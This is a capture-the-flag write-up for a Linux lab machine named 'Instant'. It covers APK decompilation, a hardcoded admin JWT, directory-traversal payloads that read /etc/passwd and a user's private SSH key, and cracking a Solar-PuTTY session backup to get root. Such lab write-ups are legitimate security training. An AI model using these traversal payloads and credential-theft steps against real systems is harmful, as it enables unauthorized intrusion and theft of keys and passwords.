# Instant

```
Difficulty: Medium
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :-- | :--- | :--- | :--- |
| 1 | `N/A` | **Nmap Scan** | Performed initial enumeration using **Nmap** to discover open ports. Identified ports `22` (SSH) and `80` (HTTP) were open. |
| 2 | `N/A` | **Subdomain & APK Analysis** | Discovered the Android application package (**APK**) on the web page. Decompiling it with `apktool` revealed two subdomains, `mywalletv1.instant.htb` and `swagger-ui.instant.htb`, in the `network_security_config.xml` file. |
| 3 | `N/A` | **JWT Token Manipulation** | The `swagger-ui` subdomain provided API documentation. An **admin JWT** was found hardcoded in the decompiled APK, which granted privileged access to API endpoints. |
| 4 | `shirohige` | **Directory Traversal** | A **directory traversal** vulnerability was found in the `/api/v1/admin/read/log` API endpoint. This was exploited to read arbitrary files. The `/etc/passwd` file revealed the username `shirohige`. |
| 5 | `shirohige` | **SSH Key Exfiltration** | The directory traversal vulnerability was used to read the `shirohige` user's private SSH key from `/home/shirohige/.ssh/id_rsa`. This key was used to log in via **SSH** and get the `user.txt` flag. |
| 6 | `root` | **Privilege Escalation** | While enumerating the system, a database file (`instant.db`) was found containing a difficult-to-crack `root` password hash. A further search uncovered a `Solar-Putty` backup file (`sessions-backup.dat`) in the `/opt` directory. |
| 7 | `root` | **Credential Decryption** | A Python script was used to decrypt the `sessions-backup.dat` file, which contained the `root` user's password. This password was then used to switch users with `su`, granting full **root** privileges and allowing for retrieval of the `root.txt` flag. |

##  Initial Reconnaissance

The first step was to perform a comprehensive Nmap scan to identify open ports and services on the target machine.

```bash
❯ nmap instant.htb -sSCV -Pn -T4

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 11:39 CST
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
```

The scan revealed two open ports: **22 (SSH)** and **80 (HTTP)**. The web server on port 80 is running **Apache 2.4.58** and hosting a site titled **"Instant Wallet"**.

-----

##  Exploiting the Web Server

###  Analyzing the APK

The "Instant Wallet" website offered a downloadable Android application package (**APK**). The APK was downloaded and decompiled using **`apktool`** to inspect its contents.

```bash
❯ apktool d instant.apk
```

By examining the decompiled files, specifically `network_security_config.xml` located in `instant/res/xml/`, two subdomains were discovered: `mywalletv1.instant.htb` and `swagger-ui.instant.htb`.

```xml
❯ cat network_security_config.xml 
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```

These new hostnames were added to the `/etc/hosts` file for proper resolution.

### Exploring with Dirsearch

Next, **`dirsearch`** was used to scan the `swagger-ui.instant.htb` subdomain for hidden directories and files.

```bash
❯ dirsearch -u "swagger-ui.instant.htb" -t 50
...
[15:21:18] 308 - 263B  - /apidocs  ->  http://swagger-ui.instant.htb/apidocs/
...
Task Completed
```

This scan revealed the `/apidocs` directory, which contained an API documentation page.

###  JWT Token Manipulation

The `/apidocs` page described an API that used a **JSON Web Token (JWT)** for authentication. By registering a new user via the API, a valid JWT was obtained.

```bash
❯ curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"email\": \"string\",  \"password\": \"z0n\",  \"pin\": \"12121\",  \"username\": \"z0n\"}"

{
  "Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6IjQ5ZmU0MjlkLTcwYzMtNGU2MC1iMDcxLTc3MDZkNjQ2MmI0NSIsImV4cCI6MTczNDcxMDYwMX0.TXTuplRyzyru23WdofFve33S7FiLgfs34_P4gXgbOcU",
  "Status": 201
}
```

The decoded JWT payload showed the user's role as **`instantian`**.

```json
{
  "id": 4,
  "role": "instantian",
  "walId": "49fe429d-70c3-4e60-b071-7706d6462b45",
  "exp": 1734710601
}
```

By searching the decompiled APK source code for the term **"admin"**, a hardcoded JWT for an **`Admin`** user was discovered.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```

Decoding this token confirmed its admin privileges.

```json
{
  "id": 1,
  "role": "Admin",
  "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db",
  "exp": 33259303656
}
```

###  Gaining User Access

With the admin token, it was possible to access privileged API endpoints. The `/api/v1/admin/read/log` endpoint was identified as a potential target for **directory traversal**. By using this vulnerability, the `/etc/passwd` file was successfully read.

```bash
{
  "/home/shirohige/logs/../../../../../../../etc/passwd": [
    ...
  ],
  "Status": 201
}
```

A leaked username, **shirohige**, was found in a JSON file on the webpage. Combining this information with the directory traversal vulnerability, the private SSH key for the `shirohige` user was read from `/home/shirohige/.ssh/id_rsa`.

```json
{
  "/home/shirohige/logs/../../../../../../../home/shirohige/.ssh/id_rsa": [
    "-----BEGIN OPENSSH PRIVATE KEY-----\n",
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n",
    "NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B\n",
    "nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH\n",
    ...
  ],
  "Status": 201
}
```

The extracted key was saved locally, its permissions were set to `600`, and then used to log in as the `shirohige` user via SSH.

-----

##  Privilege Escalation

###  Hunting for Credentials

After gaining user access, the file system was enumerated for potential privilege escalation vectors. A database file, `instant.db`, was found in `/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/`.

This file was downloaded to the local machine using **`scp`**.

```bash
❯ scp -i shirohige_key shirohige@instant.htb:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db ./
```

Inspecting the database revealed a **PBKDF2-SHA256** password hash for the **root** user. Due to the complexity of this hash, cracking it was deemed impractical.

A search of the `/opt` directory uncovered a backup file named `sessions-backup.dat` and a GitHub repository for a decryption script.

###  Cracking the Password

The `SolarPuttyDecrypterPy` script from the repository was used with the `sessions-backup.dat` file and a wordlist (`rockyou.txt`) to decrypt the password.

```bash
❯ python decrypt2.py sessions-backup.dat /usr/share/wordlists/rockyou.txt

Get the password
username：root
password：12**XXXXXXXXXXXXX
```

This successfully decrypted the password, providing the credentials for the `root` user. The password was then used to switch users with **`su`** to gain full root access.


##  Summary

  - **User Access:** The initial foothold was gained by downloading and analyzing an APK from the web server. This revealed two subdomains and a hardcoded admin JWT token. A directory traversal vulnerability in an admin API endpoint was exploited to read the `shirohige` user's private SSH key, allowing login to the server.

  - **Root Access:** Privilege escalation involved locating a backup file, `sessions-backup.dat`, which was a Solar-Putty backup file. A publicly available decryption script was used to crack the password contained within this file, leading to the `root` account credentials and full control of the machine.